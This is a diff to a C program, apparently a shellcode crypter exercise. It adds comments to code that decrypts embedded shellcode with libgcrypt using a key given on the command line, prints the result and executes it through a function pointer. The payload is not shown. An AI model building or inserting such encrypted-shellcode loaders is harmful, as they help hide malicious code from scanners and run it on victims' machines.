@@ -17,25 +17,29 @@ int main(int argc, char* argv[])
             return 0;
     }
  
-    gcry_cipher_hd_t handle;
+    gcry_cipher_hd_t handle;    //create handler
 
-    size_t keyLength = gcry_cipher_get_algo_keylen(GCRY_CIPHER);
+    size_t keyLength = gcry_cipher_get_algo_keylen(GCRY_CIPHER);   //get key length for specified cipher
 
-    size_t shell_len = strlen(shellcode);
-    unsigned char * outBuffer = malloc(shell_len);
+    size_t shell_len = strlen(shellcode);   
+    unsigned char * outBuffer = malloc(shell_len);   //reserve buffer for decoded shellcode
 
-    const char * key = argv[1]; // 16 bytes
-
-    gcry_cipher_open(&handle, GCRY_CIPHER, GCRY_MODE, 0);
+    const char * key = argv[1]; // get key
+    
+    //set up cryptographic variables
+    gcry_cipher_open(&handle, GCRY_CIPHER, GCRY_MODE, 0); 
 
     gcry_control (GCRYCTL_DISABLE_SECMEM, 0);
 
     gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);
-
+    
+    //set key
     gcry_cipher_setkey(handle, key, keyLength);
-
+    
+    //decrypt using integrated function
     gcry_cipher_decrypt(handle, outBuffer, shell_len, shellcode, shell_len);
 
+    //print decoded shellcode
     size_t index;
     printf("\nDecoded shellcode = ");
     for (index = 0; index<shell_len; index++){
@@ -47,6 +51,7 @@ int main(int argc, char* argv[])
     int (*ret)() = (int(*)())outBuffer;
     ret();
 
+    //close handle and release buffer memory
     gcry_cipher_close(handle);
     free(outBuffer);
     return 0;
